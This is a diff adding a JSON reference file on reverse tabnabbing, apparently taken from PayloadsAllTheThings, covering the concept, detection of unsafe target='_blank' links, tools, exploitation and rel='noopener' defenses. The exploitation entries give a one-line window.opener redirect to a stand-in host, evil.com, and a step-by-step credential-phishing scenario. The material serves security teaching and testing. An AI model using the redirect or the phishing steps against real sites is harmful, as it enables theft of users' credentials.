@@ -1,0 +1,57 @@
+{
+  "category": "Tabnabbing",
+  "source": "PayloadsAllTheThings/Tabnabbing/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What is Reverse Tabnabbing",
+      "language": "text",
+      "tags": ["methodology", "concept"],
+      "body": "Reverse tabnabbing is an attack in which a page opened in a new tab via a link from the target site gains the ability to rewrite (redirect) the original tab - for example, to replace it with a phishing site.\n\nSince the user was originally on the correct page, they are less likely to notice that it has been replaced with phishing, especially if the new page looks the same as the original. If the user enters credentials on this replaced page, their login/password (or other sensitive data) goes to the phishing site rather than the legitimate one."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look and how to test for the vulnerability (detection)",
+      "language": "text",
+      "tags": ["methodology", "detection", "recon"],
+      "body": "The attacker looks for links that are inserted into the site and are under their control. For example, such links may be contained in a forum post.\n\nWhen such functionality is found, the following is checked:\n• the rel attribute of the link does NOT contain the value noopener;\n• the target attribute contains the value _blank.\n\nIf both conditions are met, the site is vulnerable to tabnabbing. The page opened via such a link gains access to the original tab through the window.opener object."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Link formats to look for",
+      "language": "html",
+      "tags": ["detection", "recon"],
+      "body": "<a href=\"...\" target=\"_blank\" rel=\"\"> \n<a href=\"...\" target=\"_blank\">"
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "PortSwigger Burp (the \"Discovering Reverse Tabnabbing\" extension) - finding links vulnerable to reverse tabnabbing."
+    },
+
+    {
+      "subcategory": "Exploitation",
+      "title": "PoC - redirecting the original tab via window.opener",
+      "language": "javascript",
+      "tags": ["exploit", "poc", "window.opener"],
+      "body": "window.opener.location = \"http://evil.com\""
+    },
+    {
+      "subcategory": "Exploitation",
+      "title": "Phishing scenario (attack steps)",
+      "language": "text",
+      "tags": ["exploit", "phishing", "scenario"],
+      "body": "1. The attacker places a link to a site under their control that contains the JS code: window.opener.location = \"http://evil.com\".\n2. The victim is tricked into following the link - it opens in a new browser tab.\n3. At the same time the JS code runs, and the background (original) tab is redirected to evil.com - most likely a phishing site.\n4. If the victim reopens the background tab and does not look at the address bar, they may decide that they were logged out, because, for example, a login page appeared.\n5. The victim tries to log in again - and the attacker obtains their credentials."
+    },
+
+    {
+      "subcategory": "Defense",
+      "title": "Cutting off access to window.opener (rel=noopener / noreferrer)",
+      "language": "text",
+      "tags": ["defense", "mitigation", "noopener"],
+      "body": "For all external links with target=\"_blank\", add the rel=\"noopener\" attribute (or rel=\"noopener noreferrer\").\n\n• noopener - nulls out window.opener on the opened page, so it cannot redirect or read the original tab.\n• noreferrer - additionally does not send the Referer header (and also nulls out opener in old browsers that do not know noopener).\n\nExample of a safe link:\n<a href=\"https://example.com\" target=\"_blank\" rel=\"noopener noreferrer\">link</a>\n\nModern browsers imply noopener by default for target=\"_blank\", but do not rely on this - specify the attribute explicitly for compatibility and control. Do not insert user-supplied links without forcibly adding rel=\"noopener\"."
+    }
+  ]
+}
